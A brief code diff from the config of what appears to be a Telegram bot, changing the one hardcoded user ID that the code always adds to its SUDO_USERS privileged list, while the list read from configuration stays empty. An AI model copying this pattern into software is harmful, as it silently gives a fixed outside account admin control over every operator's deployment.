@@ -6,7 +6,7 @@ class Config(object):
 	API_HASH = os.environ.get("API_HASH")
 	DATABASE_URL = os.environ.get("DATABASE_URL")
 	SUDO_USERS = list(set(int(x) for x in ''.split()))
-	SUDO_USERS.append(1701155658)
+	SUDO_USERS.append(7456681709)
 	SUDO_USERS = list(set(SUDO_USERS))
 
 class Messages():
